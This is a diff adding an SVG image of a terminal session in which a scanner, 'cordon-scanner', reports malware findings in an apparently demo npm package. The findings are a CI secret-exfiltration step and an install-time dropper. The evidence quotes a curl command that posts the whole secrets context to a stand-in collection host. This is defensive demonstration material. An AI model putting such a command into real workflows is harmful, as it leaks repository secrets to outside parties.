@@ -1,0 +1,40 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="808" height="818" viewBox="0 0 808 818" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace" font-size="13">
+<title>cordon-scanner — a compromised npm package</title>
+<rect width="808" height="818" rx="8" fill="#11141a"/>
+<path d="M0 8a8 8 0 0 1 8-8h792a8 8 0 0 1 8 8v26.0H0z" fill="#1b1f27"/>
+<circle cx="18" cy="17" r="6" fill="#ff5f57"/>
+<circle cx="36" cy="17" r="6" fill="#febc2e"/>
+<circle cx="54" cy="17" r="6" fill="#28c840"/>
+<text x="404.0" y="21" fill="#6e7681" font-size="11" text-anchor="middle">cordon-scanner — a compromised npm package</text>
+<text y="61.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">$ cordon-scanner scan .</tspan></text>
+<text y="97.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">cordon 0.1.0 · rulepack 0.1.0 (114fbabb75bd9898)</tspan></text>
+<text y="133.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">CRITICAL MALWARE.CI.SECRET_EXFIL.001  risk 100/100</tspan></text>
+<text y="151.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  .github/workflows/release.yml:8:14</tspan></text>
+<text y="169.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  malicious · confidence high · detector config</tspan></text>
+<text y="205.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  This workflow renders the whole secret context into a command. Every</tspan></text>
+<text y="223.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  secret available to the job is materialised as a string at that point,</tspan></text>
+<text y="241.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  where it can be printed, sent anywhere, or written to an artefact. There</tspan></text>
+<text y="259.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  is no legitimate reason to serialise the entire context.</tspan></text>
+<text y="295.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  evidence  - run: curl -X POST -d &quot;${{ secret[redacted] }}&quot; https://collect.example.invalid</tspan></text>
+<text y="331.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  why       base 90 x 1.00 confidence = 90</tspan></text>
+<text y="349.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            install_time +15 (executes during install or build, as the user, before other controls)</tspan></text>
+<text y="367.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            credential_access +12 (reads environment or key material)</tspan></text>
+<text y="385.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            clamped -17 (raw score 117 clamped into 0-100)</tspan></text>
+<text y="403.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            total (clamped 0-100) = 100</tspan></text>
+<text y="439.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  fix       Reference individual secrets by name. If a step genuinely needs</tspan></text>
+<text y="457.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            several, pass each one explicitly so the set is visible in</tspan></text>
+<text y="475.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            review.</tspan></text>
+<text y="511.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">CRITICAL MALWARE.DROPPER.001  risk 100/100</tspan></text>
+<text y="529.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  scripts/setup.js:9:1</tspan></text>
+<text y="547.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  malicious · confidence high · detector capability</tspan></text>
+<text y="583.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  This install or build script retrieves content over the network and runs</tspan></text>
+<text y="601.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  it. What executes is whatever the remote host chooses to serve at install</tspan></text>
+<text y="619.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  time, so it is not pinned by the lockfile, not captured by review, and not</tspan></text>
+<text y="637.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  reproducible. The package that was audited and the code that runs are not</tspan></text>
+<text y="655.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  the same thing.</tspan></text>
+<text y="691.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  evidence  const os = require(&#x27;os&#x27;);</tspan></text>
+<text y="727.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  why       base 90 x 1.00 confidence = 90</tspan></text>
+<text y="745.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            install_time +15 (executes during install or build, as the user, before other controls)</tspan></text>
+<text y="763.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            credential_access +12 (reads environment or key material)</tspan></text>
+<text y="799.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">    ... 143 more lines</tspan></text>
+</svg>
